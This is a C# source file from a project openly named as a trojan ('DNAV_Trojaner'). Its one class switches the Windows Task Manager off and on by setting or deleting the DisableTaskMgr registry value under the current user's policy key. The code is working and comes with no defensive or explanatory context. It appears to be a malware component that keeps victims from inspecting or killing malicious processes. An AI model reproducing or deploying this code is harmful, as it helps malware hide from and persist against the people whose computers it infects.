using Microsoft.Win32;


namespace DNAV_Trojaner
{
    public static class Taskmanager
    {
        public static void Enable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if(taskManagerKey.GetValue("DisableTaskMgr") != null)
            {
                taskManagerKey.DeleteValue("DisableTaskMgr");
            }
        }

        public static void Disable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            taskManagerKey.SetValue("DisableTaskMgr", "1");
            taskManagerKey.Close();
        }
    }
}
